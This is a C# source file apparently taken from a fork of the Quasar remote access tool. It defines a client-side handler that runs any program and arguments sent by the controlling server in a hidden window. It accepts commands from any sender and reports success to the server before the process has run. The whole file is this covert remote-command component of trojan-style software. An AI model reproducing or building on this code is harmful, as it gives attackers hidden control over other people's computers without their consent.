﻿using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.other;
using Quasar.Client.FunStuff;
using Quasar.Common.Messages.QuickCommands;
using System.Diagnostics;

namespace Quasar.Client.Messages
{

    public class QuickCommandHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoSendQuickCommand;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendQuickCommand msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendQuickCommand message)
        {
            client.Send(new SetStatus { Message = "Successful Quick Command" });

            //execute a new powershell with the command
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = message.Host;
            startInfo.Arguments = message.Command;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
